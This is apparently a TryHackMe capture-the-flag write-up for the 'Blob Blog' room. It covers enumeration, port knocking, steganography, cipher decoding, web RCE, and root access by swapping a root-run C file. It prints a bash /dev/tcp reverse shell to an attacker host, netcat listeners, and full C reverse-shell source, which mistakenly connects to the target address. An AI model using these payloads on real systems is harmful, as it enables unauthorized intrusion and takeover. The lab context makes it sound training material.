# Try Hack Me - The Blob Blog
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 60
# Vulnerabilities:

# Phase 1 - Reconnaissance:

nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
`PORT   STATE SERVICE`

`22/tcp open  ssh`

`80/tcp open  http`

now lets enumerate the port 80 webpage. we find a default apache2 webpage. in the soruce code, i found an interesting base64 encoded string. lets decode it using cyber chef

after decoding it using cyber chef, we find out that it is a brainfuck cipher. lets use dcoder to decrypt the brainfuck cipher

the final output looks like this:
```bash
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```
this looks like a possible hint on port knocking. lets come to this later.
also at the end of the same webpage's source code i found this. lets base64 decode it aswell to find out bob's password. after using cyberchef, i found out that the string was encoded in base58 and not base64.

now lets carry out the port knocking using knock.

```bash
# install knockd if not installed:
sudo apt update
sudo apt install knockd -y
```
```bash
# now knock the ports in the right order:
sudo knock -v <target_ip> 1 3 5 
```
now when we start a nmap scan, we will see new ports being open

```bash
nmap -p- --min-rate=1000 <target_ip>
```
`PORT     STATE    SERVICE`

`21/tcp   open     ftp`

`22/tcp   open     ssh`

`80/tcp   open     http`

`445/tcp  open     microsoft-ds`

`5355/tcp filtered llmnr`

`8080/tcp open     http-proxy`

and our hypothesis was right! lets start with the ftp server at port 21. looks like it needs some credentials. lets use the credentials of the user bob we found in the source code of the webpage at port 80. we have successfully logged into the ftp server. lets look out for some files. we can find an examples.desktop file and a cool.jpeg image inside the ftp/files/ directory. lets transfer both of them to our attacker machine.

```bash
get examples.desktop
get ftp/files/cool.jpeg
```
as per the unwritten rule of CTFs, always perform steganography on .jpeg images we will use stegseek to bruteforce the passphrase of the cool.jpeg if it has any

```bash
# install stegseek if not installed:
sudo apt update
sudo apt install stegseek
```
```bash
stegseek cool.jpeg
```
and to our surprise there was actually a hidden file inside this image. lets read the file contents. turns out we get the credentials of some user named zcv and a directory related to user bob. maybe the credentials could be for ssh? turns out the ssh login requires an id_rsa. so we will keep on enumerating. there was a login page at port 8080 but it seems like its just a rabbit hole for us from the creator since it does not authenticate the credentials which we found from the cool.jpeg image. i am suspicious about the ports especially port 445 since the samba ports are in a pair, i.e port 139 and port 445 together form a samba service. lets perform another port scan on the port 445 specially
```bash 
nmap -p 445 -sC -sV <target_ip>
```
`PORT    STATE SERVICE VERSION`

`445/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))`

`|_http-title: Apache2 Ubuntu Default Page: It works`

`|_http-server-header: Apache/2.4.7 (Ubuntu)`

now i know why the samba port wasn't reponsding to my smbclient commands and why there was only one out of the two samba ports open. the port 445 is another http port. lets visit it to find out some more clues.

```bash
http://target_ip:445
```
in the source code wwe find the passphrase of the cool.jpeg but since we used stegseek to authomatically crack the passphrase, we wouldn't need it anyways. lets naviagate to the directory which we found in cool.jpeg.out. at the directory, we find another note for bob which could be another password for something. since we do not know much about where the password is supposed to be used, we will be fuzzing the directories of the port 445 webpage

```bash
gobuster dir -u http://<target_ip>:445 -w/usr/share/wordlists/dirb/common.txt
```
`.hta                 (Status: 403) [Size: 285]`

`.htaccess            (Status: 403) [Size: 290]`

`.htpasswd            (Status: 403) [Size: 290]`

`index.html           (Status: 200) [Size: 11596]`

`server-status        (Status: 403) [Size: 294]`

`user                 (Status: 200) [Size: 3401]`

at the /user directory we find an id_rsa private key for some user. lets paste it into a file named id_rsa. i am guessing that this must be bob's id_rsa but its just a guess

```bash
# give the id_rsa the appropriate permissions
chmod 600 id_rsa
```
after a long time of enumeration, i fell into another rabbit hole. then i realized that the credentials might be encrypted since we never really used them on the login page at port 8080 webpage. lets use this ![Viginere Cipher Decrypter ](https://www.dcode.fr/vigenere-cipher) to decrypt  the viginere cipher (just an assumption since viginere ciphers are the most common in CTFs). enter the key as the one we found at the secret directory of the webpage at port 445. turns out we were right! we get bob's credentials. lets use them on the login page.

```bash
http://<target_ip>:8080/login
```
after entering the credentials, we find a review field where we can enter user input. lets test it for potential RCE vulnerability. type in `id` into the field and then click on the link which will take us to the review. and just like that, we have acheived RCE! lets use a bash reverse shell to get an initial foothold.

```bash
#first setup a netcat listner:
nc -lnvp 4444
```
```bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```
click on the review link to trigger the reverse shell. and bingo, we get a shell as www-data! lets go directly to the /tmp directory and run linpeas. the linpeas output reveals an unusual binary at /usr/bin/blogFeedback. did not find anything useful using the strings command. lets transfer it to the attacker machine and then analyse it using Ghidra. after analysing the binary, i found something interesting in the main() function of the decompiled program. 

the orignal program basically accepts 6 parameters. if given either greater or lesser than 7, the executable will print `Order my blogs`. if there are exactly 7 arguments but the arguments are not in order, then it will print `Hmm... I disagree!`. and lastly if there are exactly 7 arguments with all the arguements being in the correct order which in this case is 6 5 4 3 2 1 since the condition is when local_c = 1, the argument will be 7-1=6, and so on. in short the conditon starts from 7, and subtracts the number of argument it is from 7. for eg if the argument is the 5th argument, then it will become 7-5=2. lets use this to get a shell as bobloblaw

```bash
/usr/bin/blogFeedback 6 5 4 3 2 1
```
we have a shell as bobloblaw. lets read the user.txt present in the /home/bobloblaw/Desktop directory. after doing this i did some manual enumeration and found a lot of potential attack vectors like a cronjob running as root, us g=having 2 sudo capabilities as root, and a few 95% attack vectors from the linpeas output. however none of them worked for me. so i decided to use pspy64 to analyse what other processes are running in the backgorund. then i found this

a C program was being compiled, executed and then deleted by root. turns out that the name C program is writable by us. let me simply remove this C file and add my own malicious C reverseshell with the same name.

```bash
# first upgrade the shell to be able to use nano:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm-256color
```
```bash
# now setup a netcat listener:
nc -lnvp 1234
```
now everything is set. we just have no paste this reverseshell below in the nano text editor:
```bash
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {AF_INET, htons(1234), inet_addr("<target_ip>")};
    connect(s, (struct sockaddr*)&a, sizeof(a));
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execl("/bin/sh", "sh", 0);
    return 0;
}
```
```bash
# paste it in nano:
nano .boring_file.c
# Ctrl+Shift+V
# Ctrl+O to save
# Ctrl+X to exit
```
now all we have to do is wait for about a minute for the process to run as root. and under a minute we get a shell as root! we read and submit the root.txt flag
